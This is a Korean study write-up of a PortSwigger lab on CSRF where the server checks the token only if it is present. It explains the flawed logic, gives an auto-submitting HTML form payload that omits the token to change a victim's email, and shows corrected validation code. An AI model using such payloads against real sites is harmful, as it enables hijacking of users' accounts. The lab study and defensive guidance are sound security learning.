# Lab: CSRF where token validation depends on token being present

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — CSRF 토큰 / 토큰 존재 여부 조건부 검증
- **링크**: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

## 목표

서버가 CSRF 토큰이 존재할 때만 검증하고, 토큰 파라미터 자체가 없으면 검증을 생략하는 허점을 이용해 이메일을 변경한다.

## 취약점 분석

서버 측 잘못된 검증 로직:

```python
csrf_token = request.POST.get('csrf')

if csrf_token:               # 토큰이 있을 때만 검증
    if not validate(csrf_token):
        return 403           # 잘못된 토큰 → 거부

# 토큰이 없으면 이 블록을 건너뜀 → 검증 없이 처리
change_email(request.POST['email'])
```

```
정상 요청 (토큰 있음):
  POST /change-email
  Body: email=victim@email.com&csrf=VALID_TOKEN
  → 토큰 있음 → 검증 → 통과

공격자 요청 (토큰 없음):
  POST /change-email
  Body: email=attacker@evil.com
  → 토큰 없음 → 검증 블록 건너뜀 → 그냥 처리!
```

## 공격 방법

### 페이로드

```html
<html>
  <body>
    <form action="https://VULNERABLE-SITE.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <!-- csrf 파라미터 없음 — 의도적으로 제거 -->
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

일반 CSRF 폼(001 랩)과 구조가 동일하고, `csrf` 필드만 포함하지 않으면 된다.

## 이전 랩들과의 비교

| 랩 | 우회 방법 | 서버의 착각 |
|----|---------|-----------|
| 001 | 토큰 없이 그대로 POST | 방어 자체 없음 |
| 002 | GET 으로 메서드 변경 | "POST 에만 검증하면 됨" |
| 003 (이번) | csrf 파라미터 제거 | "토큰 있으면 검증하면 됨" |

## 핵심 정리

- CSRF 토큰이 있을 때만 검증하면, 토큰 파라미터를 제거하는 것으로 검증 자체를 건너뛸 수 있다.
- 올바른 구현: 토큰이 없는 요청도 거부해야 한다 — 토큰 부재 = 검증 실패로 처리.
- **방어**:
  ```python
  # 잘못된 구현
  if csrf_token:
      validate(csrf_token)

  # 올바른 구현
  csrf_token = request.POST.get('csrf')
  if not csrf_token or not validate(csrf_token):
      return 403   # 없어도 거부, 잘못돼도 거부
  ```

## 배운 점 및 추가 학습

### CSRF 토큰 검증 허점 패턴 정리 (001~003 종합)

```
[허점 1] 토큰 자체가 없음 (001)
  → 그냥 POST 로 위조

[허점 2] 메서드별 불일치 (002)
  → POST 에만 검증, GET 미검증
  → GET 으로 메서드 변경

[허점 3] 토큰 존재 여부로 분기 (003 이번)
  → 토큰 있으면 검증, 없으면 통과
  → 토큰 파라미터 제거

[허점 4~] 다음 랩들
  → 토큰이 세션에 묶여있지 않음 (다른 사용자 토큰 재사용)
  → Referer 기반 검증 우회
  → SameSite 쿠키 우회
  → 기타
```

### 올바른 CSRF 토큰 검증 구현

```python
def change_email(request):
    # 1. 토큰 없으면 즉시 거부
    csrf_token = request.POST.get('csrf')
    if not csrf_token:
        return HttpResponse(403)

    # 2. 토큰 값 검증
    if not validate_csrf_token(csrf_token, request.session):
        return HttpResponse(403)

    # 3. 여기까지 통과해야 처리
    do_change_email(request.POST['email'])
```
